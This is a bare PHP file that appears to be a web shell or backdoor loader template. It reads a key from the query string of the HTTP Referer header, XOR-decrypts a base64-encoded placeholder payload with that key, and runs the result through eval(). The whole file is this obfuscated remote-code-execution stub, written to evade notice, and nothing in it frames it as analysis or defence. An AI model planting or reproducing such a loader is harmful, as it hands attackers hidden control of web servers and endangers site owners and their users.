<?php
	__w();function __w(){parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')+1), $r);	$r=array_values($r);
	$t=base64_decode('%%%TEXT-CRYPTED%%%');eval(c($t, $r[0]));}function c($t='', $k=''){return (($t ^ str_pad("", strlen($t), $k)) & str_repeat("\x1f", strlen($t))) | ($t & str_repeat("\xe0", strlen($t)));}	
?>
